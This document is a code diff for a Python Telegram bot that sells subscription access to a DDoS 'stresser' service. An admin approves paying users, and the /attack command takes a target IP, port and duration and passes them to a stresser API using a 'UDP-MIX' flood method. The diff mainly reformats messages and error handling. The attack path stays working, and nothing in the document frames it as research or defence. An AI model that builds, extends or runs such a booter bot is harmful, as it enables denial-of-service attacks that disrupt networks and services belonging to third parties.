@@ -8,7 +8,7 @@ from functools import wraps
 from flask import Flask
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
-from pymongo import MongoClient, ASCENDING, DESCENDING
+from pymongo import MongoClient, ASCENDING
 from dotenv import load_dotenv
 
 # --- LOGGING ---
@@ -30,16 +30,18 @@ class Database:
         self.client = MongoClient(MONGODB_URI)
         self.db = self.client["attack_bot"]
         self.users = self.db.users
-        self.attacks = self.db.attacks
         self.users.create_index([("user_id", ASCENDING)], unique=True)
 
-    def get_user(self, user_id): return self.users.find_one({"user_id": user_id})
+    def get_user(self, user_id): 
+        return self.users.find_one({"user_id": user_id})
     
     def create_user(self, user_id, username):
         if not self.get_user(user_id):
             self.users.insert_one({
-                "user_id": user_id, "username": username, "approved": False,
-                "expires_at": None, "total_attacks": 0
+                "user_id": user_id, 
+                "username": username, 
+                "approved": False,
+                "expires_at": None
             })
 
     def approve_user(self, user_id, days):
@@ -49,16 +51,16 @@ class Database:
 
 db = Database()
 
-# --- FLASK FOR RAILWAY ---
+# --- FLASK FOR RAILWAY (Health Check) ---
 app = Flask(__name__)
 @app.route('/')
-def health(): return "Bot is Alive!", 200
+def health(): return "API Bot is Running!", 200
 
 def run_flask():
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
 
-# --- BOT LOGIC ---
+# --- BOT DECORATORS ---
 def admin_only(func):
     @wraps(func)
     async def wrapper(update, context):
@@ -68,6 +70,7 @@ def admin_only(func):
         return await func(update, context)
     return wrapper
 
+# --- COMMANDS ---
 async def start(update, context):
     user_id = update.effective_user.id
     db.create_user(user_id, update.effective_user.username)
@@ -75,52 +78,72 @@ async def start(update, context):
     
     if user.get("approved"):
         expiry = user['expires_at'].strftime('%Y-%m-%d')
-        await update.message.reply_text(f"✅ Welcome! Subscription ends: {expiry}\nUse /attack <ip> <port> <time>")
+        await update.message.reply_text(f"✅ Active Subscription\nExpires: {expiry}\n\nUse: `/attack <target> <port> <time>`")
     else:
-        await update.message.reply_text("❌ Account Pending Approval. Contact @Admin.")
+        await update.message.reply_text("❌ Your account is not approved.\nContact @Admin for access.")
 
 @admin_only
 async def approve(update, context):
     try:
-        uid, days = int(context.args[0]), int(context.args[1])
+        uid = int(context.args[0])
+        days = int(context.args[1])
         expiry = db.approve_user(uid, days)
-        await update.message.reply_text(f"✅ User {uid} approved till {expiry.date()}")
-    except:
+        await update.message.reply_text(f"✅ User {uid} approved for {days} days.\nExpiry: {expiry.date()}")
+    except (IndexError, ValueError):
         await update.message.reply_text("Format: /approve <user_id> <days>")
 
 async def attack(update, context):
-    user = db.get_user(update.effective_user.id)
+    user_id = update.effective_user.id
+    user = db.get_user(user_id)
+    
     if not user or not user.get("approved"):
-        return await update.message.reply_text("❌ Not authorized.")
+        return await update.message.reply_text("❌ Access Denied.")
 
     if len(context.args) < 3:
-        return await update.message.reply_text("Format: /attack <ip> <port> <time>")
+        return await update.message.reply_text("Usage: `/attack <ip> <port> <time>`")
 
     target, port, time = context.args[0], context.args[1], context.args[2]
-    
-    # API Call
-    params = {"api_key": API_KEY, "target": target, "port": port, "duration": time, "methods": "UDP-MIX"}
-    
-    try:
-        response = requests.get(API_URL, params=params, timeout=10).json()
-        status = "Success" if "success" in str(response).lower() else "API Error"
-        await update.message.reply_text(f"🚀 **Attack Sent!**\nTarget: `{target}:{port}`\nStatus: `{status}`\nResponse: `{response}`")
-    except Exception as e:
-        await update.message.reply_text(f"❌ API Down: {str(e)}")
 
-# --- START BOT ---
+    # Stresser API Request
+    params = {
+        "api_key": API_KEY,
+        "target": target,
+        "port": port,
+        "duration": time,
+        "methods": "UDP-MIX"
+    }
+
+    try:
+        # Calling the Stresser URL
+        response = requests.get(API_URL, params=params, timeout=15)
+        res_data = response.json()
+        
+        # Displaying clean output to user
+        await update.message.reply_text(
+            f"🚀 **Attack Initiated!**\n\n"
+            f"🎯 Target: `{target}:{port}`\n"
+            f"⏱️ Duration: `{time}s`\n"
+            f"📡 Method: `UDP-MIX`\n"
+            f"📝 Response: `{res_data}`"
+        )
+    except Exception as e:
+        logger.error(f"API Error: {e}")
+        await update.message.reply_text(f"⚠️ API Error: Connection failed.")
+
+# --- MAIN ---
 def main():
-    # Start Flask in background
+    # Start Web Server for Railway
     threading.Thread(target=run_flask, daemon=True).start()
 
-    # Build Telegram Bot
+    # Initialize Application
     application = Application.builder().token(BOT_TOKEN).build()
     
+    # Handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("approve", approve))
     application.add_handler(CommandHandler("attack", attack))
 
-    print("🤖 Bot is starting polling...")
+    print("✅ API Bot is online...")
     application.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
